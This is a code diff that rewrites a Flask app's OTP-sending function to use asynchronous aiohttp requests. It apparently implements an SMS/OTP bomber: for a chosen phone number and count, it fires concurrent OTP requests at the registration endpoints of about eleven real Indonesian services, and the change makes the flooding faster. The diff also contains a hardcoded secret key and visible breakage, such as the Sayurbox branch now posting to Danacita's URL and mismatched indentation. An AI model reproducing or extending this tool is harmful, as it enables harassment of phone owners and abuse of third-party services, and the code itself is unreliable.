@@ -1,5 +1,9 @@
+from aiohttp import ClientSession
 from flask import Flask, request, render_template, redirect, url_for, flash
-import requests, json, random, uuid
+import asyncio
+import random
+import json
+import uuid
 
 app = Flask(__name__)
 app.secret_key = "b'\xfd!\x11\x9frZ%\x93Ip\xbf\xdb8{-B\x14\xb9\xa58B\xa6\xc8\x15'"
@@ -48,11 +52,17 @@ def index():
         return redirect(url_for('index'))
     return render_template('index.html')
 
-def send_otp(phone_number, otp_count):
+async def send_otp(phone_number, otp_count):
     providers = ['danacita', 'sayurbox', 'matahari', 'mraladin', 'pinhome', 'saturdays', 'redbus', 'sobatbangun', 'nutriclub', 'ruangguru', 'bpjsktn']
-    for i in range(otp_count):
-        for provider in providers:
-            formatted_phone_number = format_phone_number(provider, phone_number)
+    async with ClientSession() as session:
+        tasks = []
+        for i in range(otp_count):
+            for provider in providers:
+                formatted_phone_number = format_phone_number(provider, phone_number)
+                tasks.append(send_otp_to_provider(session, provider, formatted_phone_number))
+        await asyncio.gather(*tasks)
+
+async def send_otp_to_provider(session, provider, formatted_phone_number):
             if provider == 'sayurbox':
                 headers_sayurbox = {
                     'Accept': '*/*',
@@ -75,7 +85,8 @@ def send_otp(phone_number, otp_count):
                     "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
                 })
 
-                response_sayurbox_wa = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox)
+                async with session.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_sayurbox, data=data_whatsapp_sayurbox) as response:
+                    await response.text()
                 
             if provider == 'danacita':
                 headers_danacita = {
@@ -101,7 +112,8 @@ def send_otp(phone_number, otp_count):
                 })
                 
                 
-                response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
+                async with session.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita) as response:
+                    await response.text()
             
             if provider == 'misteraladin':
                 headers_misterAladin = {
@@ -131,8 +143,8 @@ def send_otp(phone_number, otp_count):
                     "type": "register"
                 })
                 
-                response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
-
+                async with session.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin) as response:
+                    await response.text()
             if provider == 'pinhome':
                 #pinhome
                 headers_pinhome = {
@@ -164,7 +176,8 @@ def send_otp(phone_number, otp_count):
                     "phoneNumber": formatted_phone_number
                 })
                 
-                response_pinhome = requests.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome)
+                async with session.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome) as response:
+                    await response.text()
 
             if provider =='saturdays':
                 headers_saturdays = {
@@ -198,7 +211,8 @@ def send_otp(phone_number, otp_count):
                     "type": "MSG"
                 })
                 
-                response_saturdays = requests.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays)
+                async with session.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays) as response:
+                    await response.text()
                 
             if provider == 'kelaspintar':
                 headers_kelaspintar = {
@@ -224,7 +238,8 @@ def send_otp(phone_number, otp_count):
                     "phone_number": formatted_phone_number,
                 })
                 
-                response_kelaspintar = requests.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar)
+                async with session.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar) as response:
+                    await response.text()
                 
             
             if provider =='sobatbangun':
@@ -250,7 +265,8 @@ def send_otp(phone_number, otp_count):
                     "email_or_phone": formatted_phone_number,
                 })
                 
-                response_sobatbangun = requests.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun)
+                async with session.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun) as response:
+                    await response.text()
                
             if provider == 'nutriclub':
                 headers_nutriclub = {
@@ -276,7 +292,8 @@ def send_otp(phone_number, otp_count):
                     "old_phone": formatted_phone_number,
                 })
                 
-                response_data_nutriclub = requests.post(f"https://www.nutriclub.co.id/membership/otp/?phone={formatted_phone_number}&old_phone={formatted_phone_number}", headers=headers_nutriclub, data=data_nutriclub)
+                async with session.post(f"https://www.nutriclub.co.id/membership/otp/?phone={formatted_phone_number}&old_phone={formatted_phone_number}", headers=headers_nutriclub, data=data_nutriclub) as response:
+                    await response.text()
             
             if provider == 'bpjsktn':
                 headers_bpjsktn = {
@@ -303,7 +320,8 @@ def send_otp(phone_number, otp_count):
                     "nomor_handphone": formatted_phone_number,
                 })
                 
-                response_bpjsktn = requests.post("https://www.bpjsketenagakerjaan.go.id/bpu/otp", headers=headers_bpjsktn, data=data_bpjsktn)
+                async with session.post("https://www.bpjsketenagakerjaan.go.id/bpu/otp", headers=headers_bpjsktn, data=data_bpjsktn) as response:
+                    await response.text()
                 
             if provider =='sociolla':
                 headers_sociolla = {
@@ -333,7 +351,8 @@ def send_otp(phone_number, otp_count):
                     "entity": formatted_phone_number
                 })
                 
-                response_sociolla = requests.post("https://soco-api.sociolla.com/auth/otp/code", headers=headers_sociolla, data=data_sociolla)
+                async with session.post("https://soco-api.sociolla.com/auth/otp/code", headers=headers_sociolla, data=data_sociolla) as response:
+                    await response.text()
             
 
 if __name__ == '__main__':
